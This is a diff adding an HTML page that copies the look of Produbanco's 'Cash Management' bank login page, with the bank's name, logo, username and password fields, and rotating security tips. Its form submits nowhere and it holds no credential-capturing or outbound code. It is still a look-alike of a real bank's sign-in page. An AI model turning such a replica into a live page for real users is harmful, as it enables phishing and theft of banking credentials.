@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Cash Management Produbanco</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+      * { box-sizing: border-box; }
+      html, body {
+        margin: 0;
+        min-height: 100%;
+        background: #fff;
+        font-family: 'Nunito Sans', Arial, sans-serif;
+        color: #3e3e3e;
+      }
+      .page {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 48px 16px 32px;
+      }
+      .logo {
+        height: 72px;
+        width: auto;
+        margin-bottom: 28px;
+      }
+      .langs {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 22px;
+      }
+      .lang {
+        min-width: 92px;
+        height: 32px;
+        padding: 0 16px;
+        border-radius: 999px;
+        border: 1px solid #00693c;
+        background: #fff;
+        color: #00693c;
+        font-size: 13px;
+        font-weight: 700;
+        font-family: inherit;
+        cursor: pointer;
+      }
+      .lang.active {
+        background: #00693c;
+        color: #fff;
+      }
+      .box {
+        width: min(560px, 100%);
+        background: #f4f4f4;
+        border-radius: 2px;
+        overflow: hidden;
+      }
+      .box-head {
+        background: #8dc63f;
+        color: #fff;
+        text-align: center;
+        font-size: 18px;
+        font-weight: 700;
+        padding: 10px 16px;
+      }
+      .box-body {
+        padding: 28px 36px 26px;
+      }
+      .row {
+        display: grid;
+        grid-template-columns: 118px 1fr;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 16px;
+      }
+      .row label {
+        text-align: right;
+        font-size: 14px;
+      }
+      .input {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        background: #fff;
+        border: 1px solid #d8d8d8;
+        border-radius: 6px;
+        height: 36px;
+        padding: 0 10px;
+      }
+      .input:focus-within { border-color: #00693c; }
+      .input svg { flex-shrink: 0; color: #8b8b8b; }
+      .input input {
+        flex: 1;
+        min-width: 0;
+        border: 0;
+        outline: none;
+        height: 100%;
+        font-size: 13px;
+        letter-spacing: 0.3px;
+        font-family: inherit;
+        color: #3e3e3e;
+        background: transparent;
+        text-transform: uppercase;
+      }
+      .input input::placeholder {
+        color: #b3b3b3;
+        text-transform: uppercase;
+      }
+      .actions {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 12px;
+        margin-top: 10px;
+      }
+      .pill {
+        min-width: 210px;
+        height: 36px;
+        border: 0;
+        border-radius: 999px;
+        background: #00693c;
+        color: #fff;
+        font-size: 14px;
+        font-weight: 700;
+        font-family: inherit;
+        cursor: pointer;
+      }
+      .pill.static {
+        cursor: default;
+        pointer-events: none;
+      }
+      .tips {
+        width: min(560px, 100%);
+        margin-top: 28px;
+        text-align: left;
+      }
+      .tips-title {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 14px;
+        margin-bottom: 8px;
+      }
+      .tips-title svg { color: #8b8b8b; }
+      .tip {
+        min-height: 22px;
+        font-size: 14px;
+        margin: 0 0 14px;
+      }
+      .dots {
+        display: flex;
+        justify-content: flex-end;
+        gap: 8px;
+      }
+      .dot {
+        width: 22px;
+        height: 22px;
+        border-radius: 50%;
+        border: 1px solid #c5c5c5;
+        background: #fff;
+        color: #8b8b8b;
+        font-size: 11px;
+        font-weight: 700;
+        display: grid;
+        place-items: center;
+        padding: 0;
+        font-family: inherit;
+        cursor: pointer;
+      }
+      .dot.active {
+        background: #00693c;
+        border-color: #00693c;
+        color: #fff;
+      }
+      .footer {
+        margin-top: 28px;
+        display: flex;
+        gap: 22px;
+        justify-content: center;
+      }
+      .footer span {
+        color: #8dc63f;
+        font-size: 13px;
+        pointer-events: none;
+      }
+      @media (max-width: 560px) {
+        .row { grid-template-columns: 1fr; }
+        .row label { text-align: left; }
+        .box-body { padding: 22px 16px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page">
+      <img class="logo" src="/original/logo.png" alt="Produbanco Grupo Promerica" />
+
+      <div class="langs">
+        <button type="button" class="lang active" id="btnEs">Español</button>
+        <button type="button" class="lang" id="btnEn">English</button>
+      </div>
+
+      <section class="box">
+        <div class="box-head" id="tituloCaja">Cash Management Produbanco</div>
+        <form class="box-body" id="frmCash" novalidate>
+          <div class="row">
+            <label for="Usuario" id="lblUsuario">Usuario:</label>
+            <div class="input">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+                <circle cx="12" cy="8" r="3.2"></circle>
+                <path d="M5.5 19c.8-3.3 3.3-5 6.5-5s5.7 1.7 6.5 5"></path>
+              </svg>
+              <input id="Usuario" name="Usuario" type="text" maxlength="40" autocomplete="off" placeholder="INGRESA TU USUARIO" />
+            </div>
+          </div>
+          <div class="row">
+            <label for="Clave" id="lblClave">Contraseña:</label>
+            <div class="input">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+                <rect x="6" y="11" width="12" height="9" rx="1.5"></rect>
+                <path d="M8.5 11V8.2a3.5 3.5 0 0 1 7 0V11"></path>
+              </svg>
+              <input id="Clave" name="Clave" type="password" maxlength="40" autocomplete="off" placeholder="INGRESA TU CONTRASEÑA" />
+            </div>
+          </div>
+          <div class="actions">
+            <button class="pill" type="submit" id="btnIngresar">Ingresar</button>
+            <button class="pill static" type="button" id="btnOlvido">Olvidaste tu Contraseña</button>
+          </div>
+        </form>
+      </section>
+
+      <section class="tips">
+        <div class="tips-title">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+            <circle cx="12" cy="12" r="9"></circle>
+            <path d="M12 11v6M12 8h.01"></path>
+          </svg>
+          <span id="tipsTitulo">Consejos de seguridad</span>
+        </div>
+        <p class="tip" id="tipTexto">No compartir tus datos con nadie.</p>
+        <div class="dots" id="dots"></div>
+      </section>
+
+      <div class="footer">
+        <span id="linkSeguridad">Seguridad en Canales</span>
+        <span id="linkManuales">Manuales de uso</span>
+      </div>
+    </div>
+    <script>
+      const tipsEs = [
+        'No compartir tus datos con nadie.',
+        'No ingreses desde computadoras públicas.',
+        'Verifica que la dirección web sea la oficial de Produbanco.',
+        'Cambia tu contraseña periódicamente.',
+        'Cierra tu sesión al terminar de usar el sistema.',
+        'Produbanco no solicita claves por correo ni mensajes.',
+        'Mantén actualizado tu navegador y sistema operativo.',
+      ]
+      const tipsEn = [
+        'Do not share your data with anyone.',
+        'Do not sign in from public computers.',
+        'Check that the website is the official Produbanco address.',
+        'Change your password periodically.',
+        'Sign out when you finish using the system.',
+        'Produbanco will never ask for passwords by email or messages.',
+        'Keep your browser and operating system updated.',
+      ]
+      const copy = {
+        es: {
+          titulo: 'Cash Management Produbanco',
+          usuario: 'Usuario:',
+          clave: 'Contraseña:',
+          phUsuario: 'INGRESA TU USUARIO',
+          phClave: 'INGRESA TU CONTRASEÑA',
+          ingresar: 'Ingresar',
+          olvido: 'Olvidaste tu Contraseña',
+          tips: 'Consejos de seguridad',
+          seguridad: 'Seguridad en Canales',
+          manuales: 'Manuales de uso',
+        },
+        en: {
+          titulo: 'Cash Management Produbanco',
+          usuario: 'Username:',
+          clave: 'Password:',
+          phUsuario: 'ENTER YOUR USERNAME',
+          phClave: 'ENTER YOUR PASSWORD',
+          ingresar: 'Sign in',
+          olvido: 'Forgot your Password',
+          tips: 'Security tips',
+          seguridad: 'Channel Security',
+          manuales: 'User manuals',
+        },
+      }
+
+      const usuario = document.getElementById('Usuario')
+      const clave = document.getElementById('Clave')
+      const tipTexto = document.getElementById('tipTexto')
+      const dots = document.getElementById('dots')
+      const btnEs = document.getElementById('btnEs')
+      const btnEn = document.getElementById('btnEn')
+      let lang = 'es'
+      let tip = 0
+
+      function tips() {
+        return lang === 'es' ? tipsEs : tipsEn
+      }
+
+      function pintarTips() {
+        const lista = tips()
+        tipTexto.textContent = lista[tip]
+        dots.innerHTML = lista
+          .map((_, i) => `<button type="button" class="dot${i === tip ? ' active' : ''}" data-i="${i}">${i + 1}</button>`)
+          .join('')
+      }
+
+      function aplicarIdioma() {
+        const t = copy[lang]
+        document.getElementById('tituloCaja').textContent = t.titulo
+        document.getElementById('lblUsuario').textContent = t.usuario
+        document.getElementById('lblClave').textContent = t.clave
+        usuario.placeholder = t.phUsuario
+        clave.placeholder = t.phClave
+        document.getElementById('btnIngresar').textContent = t.ingresar
+        document.getElementById('btnOlvido').textContent = t.olvido
+        document.getElementById('tipsTitulo').textContent = t.tips
+        document.getElementById('linkSeguridad').textContent = t.seguridad
+        document.getElementById('linkManuales').textContent = t.manuales
+        btnEs.classList.toggle('active', lang === 'es')
+        btnEn.classList.toggle('active', lang === 'en')
+        pintarTips()
+      }
+
+      usuario.addEventListener('input', function () {
+        this.value = this.value.toUpperCase()
+      })
+
+      dots.addEventListener('click', function (event) {
+        const btn = event.target.closest('.dot')
+        if (!btn) return
+        tip = Number(btn.dataset.i)
+        pintarTips()
+      })
+
+      btnEs.addEventListener('click', function () {
+        lang = 'es'
+        aplicarIdioma()
+      })
+      btnEn.addEventListener('click', function () {
+        lang = 'en'
+        aplicarIdioma()
+      })
+
+      document.getElementById('frmCash').addEventListener('submit', function (event) {
+        event.preventDefault()
+      })
+
+      pintarTips()
+      window.setInterval(function () {
+        tip = (tip + 1) % tips().length
+        pintarTips()
+      }, 4000)
+    </script>
+  </body>
+</html>
